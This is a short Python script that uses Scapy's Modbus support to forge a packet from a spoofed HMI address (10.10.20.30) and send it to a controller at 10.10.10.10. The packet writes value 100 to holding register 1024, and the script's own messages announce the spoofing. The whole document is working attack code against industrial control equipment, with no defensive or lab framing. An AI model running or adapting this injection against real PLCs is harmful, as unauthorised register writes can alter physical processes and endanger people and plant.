#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.modbus import *

print("Crafting packet: Spoofed HMI IP Write...")
spoofed_hmi_packet = IP(src="10.10.20.30", dst="10.10.10.10") / \
                     TCP(sport=RandShort(), dport=502) / \
                     ModbusADURequest(transId=102, unitId=1) / \
                     ModbusPDU06WriteSingleRegisterRequest(startAddr=1024, registerVal=100)

print("Sending packet...")
send(spoofed_hmi_packet, verbose=0)
print("Packet sent, spoofing HMI IP 10.10.20.30.")
